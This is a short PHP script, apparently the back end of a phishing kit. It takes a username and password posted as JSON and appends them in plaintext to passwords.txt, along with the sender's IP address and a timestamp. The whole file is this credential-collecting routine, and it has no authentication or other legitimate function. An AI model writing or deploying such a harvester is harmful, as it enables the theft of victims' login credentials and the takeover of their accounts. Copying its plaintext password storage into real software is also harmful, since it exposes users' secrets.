<?php

date_default_timezone_set("America/Mexico_City");
$fechaYHora = date("Y-m-d H:i:s");

$ip = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "";


$cargaUtil = json_decode(file_get_contents("php://input"));
$usuario = $cargaUtil->usuario;
$password = $cargaUtil->password;
# Armar mensaje
$mensaje = "==========================" . PHP_EOL;
$mensaje .= "Fecha y hora: $fechaYHora" . PHP_EOL;
$mensaje .= "IP: $ip" . PHP_EOL;
$mensaje .= "Usuario: '$usuario'" . PHP_EOL;
$mensaje .= "Contraseña: '$password'" . PHP_EOL;
$mensaje .= PHP_EOL;

file_put_contents("passwords.txt", $mensaje, FILE_APPEND);
?>